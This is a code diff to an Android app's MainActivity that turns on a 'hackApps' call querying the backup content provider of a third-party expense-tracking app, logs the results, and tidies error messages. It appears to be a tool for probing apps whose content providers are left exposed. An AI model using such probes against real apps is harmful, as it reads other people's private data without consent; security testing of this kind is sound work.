@@ -29,7 +29,7 @@ public class MainActivity extends Activity {
 		/**
 		 * Expense Manager
 		 */
-//		hackApps("Expense Manager", "at.markushi.expensemanager.provider.backup", "*");
+		hackApps("Expense Manager", "at.markushi.expensemanager.provider.backup", "*");
 		/**
 		 * COMMAND
 		 */
@@ -54,8 +54,10 @@ public class MainActivity extends Activity {
 		try {
 			Cursor FBcursor = FBcontentresolver.query(FBURI, projection, null, null, null);
 //			Cursor FBcursor = managedQuery(FBURI, projection, null, null, null);
-			if(FBcursor == null)
+			if(FBcursor == null) {
 				Log.v(ParserApplication.getDebugTag(), "Got null cursor!");
+				stringToSetOnTextView.append("For app "+appName+" got null cursor!\n");
+			}
 			if(FBcursor.moveToFirst()) {
 //				Toast.makeText(this, FBcursor.getColumnName(0)+FBcursor.getColumnCount(), Toast.LENGTH_LONG).show();
 				Log.v(ParserApplication.getDebugTag(), Integer.toString(FBcursor.getCount()));
@@ -64,7 +66,7 @@ public class MainActivity extends Activity {
 			else
 				Toast.makeText(this, "Can't get it!", Toast.LENGTH_LONG).show();
 		} catch(Exception e) {
-			Toast.makeText(this, "Exception in query"+e.getMessage()+e.getLocalizedMessage()+e.getCause(), Toast.LENGTH_LONG).show();
+			Toast.makeText(this, "Exception in query"+e.getMessage(), Toast.LENGTH_LONG).show();
 		}
 		mDisplayTextView.setText(stringToSetOnTextView.toString());
 	}
